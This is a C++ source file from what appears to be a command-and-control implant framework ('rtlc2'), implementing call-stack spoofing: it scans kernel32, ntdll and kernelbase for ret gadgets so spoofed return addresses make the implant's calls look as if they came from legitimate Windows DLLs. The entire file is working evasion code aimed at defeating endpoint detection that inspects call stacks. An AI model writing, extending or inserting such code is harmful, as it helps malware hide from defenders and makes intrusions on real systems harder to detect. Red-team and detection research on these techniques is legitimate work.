// Stack Spoofing - Make call stacks appear legitimate
// Replaces return addresses to look like calls from Windows DLLs
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <cstring>

namespace rtlc2 {
namespace evasion {

// Gadget addresses found in ntdll/kernel32
static void* g_spoofGadget = nullptr;

// Find a JMP [RBX] or similar gadget in a DLL's .text section
static void* FindGadgetInModule(HMODULE hModule) {
    if (!hModule) return nullptr;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((const char*)section[i].Name, ".text") == 0) {
            BYTE* start = (BYTE*)hModule + section[i].VirtualAddress;
            DWORD size = section[i].Misc.VirtualSize;

            // Look for 'ret' (0xC3) preceded by common instruction patterns
            // that make a plausible return point
            for (DWORD j = 16; j < size - 1; j++) {
                // ADD RSP, XX; RET pattern - common function epilogue
                if (start[j] == 0xC3 && start[j-1] >= 0x20 && start[j-1] <= 0x78 &&
                    start[j-2] == 0xC4 && start[j-3] == 0x83) {
                    return &start[j]; // Point to the ret
                }
                // POP RBP; RET pattern
                if (start[j] == 0xC3 && start[j-1] == 0x5D) {
                    return &start[j];
                }
            }
            break;
        }
    }
    return nullptr;
}

bool InitStackSpoof() {
    // Find gadgets in common Windows DLLs
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    g_spoofGadget = FindGadgetInModule(hKernel32);

    if (!g_spoofGadget) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        g_spoofGadget = FindGadgetInModule(hNtdll);
    }

    if (!g_spoofGadget) {
        HMODULE hKernelBase = GetModuleHandleA("kernelbase.dll");
        g_spoofGadget = FindGadgetInModule(hKernelBase);
    }

    return g_spoofGadget != nullptr;
}

void* GetSpoofedReturnAddress() {
    return g_spoofGadget;
}

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
